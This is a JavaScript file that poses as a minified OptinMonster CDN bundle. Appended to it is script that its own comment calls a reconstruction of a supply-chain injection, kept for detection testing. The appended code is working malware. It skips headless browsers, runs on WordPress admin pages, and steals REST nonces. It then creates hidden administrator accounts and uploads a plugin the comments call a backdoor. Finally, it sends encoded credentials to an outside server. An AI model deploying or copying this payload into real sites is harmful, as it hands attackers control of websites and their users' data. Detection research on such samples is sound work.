/*! OptinMonster api.min.js — legitimate CDN bundle (truncated) */
!function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}n.m=e,n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})};var om=window.OptinMonsterApp||{};om.init=function(){};window.OptinMonsterApp=om}({});

/* === Injected payload (Sansec OptinMonster supply-chain attack, 2026) ===
   Behavioral reconstruction for detection regression — appended to the
   legitimate CDN bundle exactly as the real injection was delivered. */
(function () {
  // Gate: bail on automation / headless / zero-size windows.
  if (navigator.webdriver) return;
  if (/HeadlessChrome/.test(navigator.userAgent)) return;
  if (window.outerWidth === 0 || window.outerHeight === 0) return;
  if (!/\/wp-admin\//.test(location.pathname)) return;

  var XK = "jX9kM2nP4qR6sT8v";
  function xenc(s) {
    var o = "";
    for (var i = 0; i < s.length; i++) {
      o += String.fromCharCode(s.charCodeAt(i) ^ XK.charCodeAt(i % XK.length));
    }
    return btoa(o);
  }

  // Recon: harvest REST/AJAX nonces and the WordPress version.
  var nonce = (window.wpApiSettings && wpApiSettings.nonce) || "";
  var wpver = (document.querySelector('meta[name="generator"]') || {}).content || "";

  // Create the operator's hidden administrator accounts.
  function mkAdmin(u, p, em) {
    return fetch("/wp-json/wp/v2/users", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-WP-Nonce": nonce },
      body: JSON.stringify({ username: u, password: p, email: em, roles: ["administrator"] })
    });
  }
  mkAdmin("developer_api1", "customer1usx", "customer1usx@gmail.com");
  mkAdmin("dev_" + Math.random().toString(36).slice(2, 8), "P@ss" + Date.now(), "x@x.cc");

  // Silently install the self-hiding PHP backdoor plugin.
  var fd = new FormData();
  fd.append("action", "upload-plugin");
  fd.append("_wpnonce", nonce);
  fetch("/wp-admin/update.php?action=upload-plugin", { method: "POST", body: fd });

  // Exfil: XOR (key above) + base64, beaconed to the tidio.cc C2 cdn-cgi paths.
  var report = "developer_api1:customer1usx|" + location.origin + "|" + wpver + "|" + Date.now();
  fetch("https://tidio.cc/cdn-cgi/p", { method: "POST", mode: "no-cors", body: xenc(report) });
  fetch("https://tidio.cc/cdn-cgi/b", { method: "POST", mode: "no-cors", body: xenc(nonce) });
})();
